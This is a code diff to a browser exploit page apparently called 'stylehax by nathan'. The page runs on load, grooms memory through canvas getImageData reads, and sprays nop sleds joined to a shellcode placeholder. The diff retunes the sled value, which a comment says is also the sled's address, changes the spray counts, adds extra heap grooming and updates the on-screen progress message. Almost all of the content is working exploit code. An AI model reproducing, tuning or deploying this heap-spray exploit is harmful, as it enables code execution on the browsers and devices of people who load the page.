@@ -14,6 +14,8 @@
    </style>
    <script>
 
+      var shellcode = "{REPLACE_SHELLCODE_HERE}";
+
       function exploit() {
          var canvases = [];
          var N = 0x480;
@@ -67,17 +69,21 @@
             arr[i] = c.getImageData(0, 0, obj_size / 4, 1).data[0];
          }
 
-         var nops = "\u0000";
-         while (nops.length < 0x1000) {
+         // 0x2bc5120 is effectively a nop, and is also the address of our nop sled
+         var nops = "\u2051\ubc02";
+         while (nops.length < 0x10000) {
             nops += nops;
          }
 
-         var shellcode = "{REPLACE_SHELLCODE_HERE}";
-
          // spray nopsleds and shellcode
          var a = new Array();
-         for (var i = 0; i < 0x40; i++) {
+         for (var i = 0; i < 0x4; i++) {
             a[i] = nops + shellcode;
+         }
+
+         // more heap magic...
+         for (var i = 0; i < 0x100; i++) {
+            a[4 + i] = "" + i;
          }
 
          // accessing this property causes jump to bootstrap
@@ -90,7 +96,7 @@
 <body onload="exploit()">
    <div style="width: 250px">
       <p>stylehax by nathan</p>
-      <p>exploit in progress :)</p>
+      <p>exploit in progress... if you've waited > 30 seconds, reboot and try again!</p>
    </div>
 </body>
 
